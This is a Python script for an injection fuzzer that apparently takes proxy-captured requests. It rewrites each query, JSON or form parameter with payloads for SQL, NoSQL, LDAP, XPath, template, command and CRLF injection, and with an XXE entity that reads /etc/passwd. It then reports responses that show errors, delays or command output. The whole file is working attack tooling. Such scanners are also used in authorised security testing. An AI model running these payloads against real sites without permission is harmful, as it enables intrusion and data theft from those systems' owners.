import json, copy, requests, re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = {
    "SQLi": ["' OR '1'='1", "\" OR \"1\"=\"1", "'; WAITFOR DELAY '0:0:5'--", "1' AND 1=1--"],
    "NoSQLi": ['{"$ne": null}', "'; return true; var a='"],
    "LDAPi": ["*)(uid=*))(|(uid=*", "admin)(&)"],
    "XPathi": ["' or '1'='1", "\" or \"1\"=\"1"],
    "SSTI": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
    "Commandi": ["; ls", "| id", "`id`", "$(id)"],
    "CRLF": ["/%%0d%%0aX-Injected: true"],
    "XXE": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
}

def fuzz_parameter(url, method, headers, body, param, payload):
    try:
        if param in dict(parse_qs(urlparse(url).query)):
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            qs[param] = [payload]
            new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            return requests.request(method, new_url, headers=headers, data=body, timeout=5)
        if body and 'application/json' in headers.get('Content-Type',''):
            j = json.loads(body)
            if param in j:
                j[param] = payload
                return requests.request(method, url, headers=headers, json=j, timeout=5)
        if body and 'application/x-www-form-urlencoded' in headers.get('Content-Type',''):
            body_params = parse_qs(body)
            if param in body_params:
                body_params[param] = [payload]
                new_body = urlencode(body_params, doseq=True)
                return requests.request(method, url, headers=headers, data=new_body, timeout=5)
    except: pass
    return None

def is_vulnerable(resp, inj_type):
    if not resp: return False
    text = resp.text.lower()
    if inj_type == "SQLi":
        return any(e in text for e in ["sql syntax","mysql_fetch","unclosed quotation","ora-"]) or resp.elapsed.total_seconds() > 5
    elif inj_type == "SSTI": return "49" in text
    elif inj_type == "Commandi": return any(s in text for s in ["uid=","root:","gid="])
    elif inj_type == "XXE": return "root:" in text
    return False

def process_proxy_task(flow_json):
    data = json.loads(flow_json)
    url = data['url']
    method = data['method']
    headers = data['headers']
    body = data.get('body','')
    findings = []
    params = set()
    parsed = urlparse(url)
    if parsed.query:
        params.update(parse_qs(parsed.query).keys())
    if body:
        if 'application/json' in headers.get('Content-Type',''):
            try:
                j = json.loads(body)
                if isinstance(j, dict): params.update(j.keys())
            except: pass
        elif 'application/x-www-form-urlencoded' in headers.get('Content-Type',''):
            params.update(parse_qs(body).keys())
    for param in params:
        for inj_type, payloads in PAYLOADS.items():
            for p in payloads:
                resp = fuzz_parameter(url, method, headers, body, param, p)
                if resp and is_vulnerable(resp, inj_type):
                    findings.append({
                        "type": f"{inj_type} Injection",
                        "severity": "critical" if inj_type in ["SQLi","Commandi"] else "high",
                        "url": url,
                        "param": param,
                        "payload": p,
                        "evidence": resp.text[:300]
                    })
    return findings
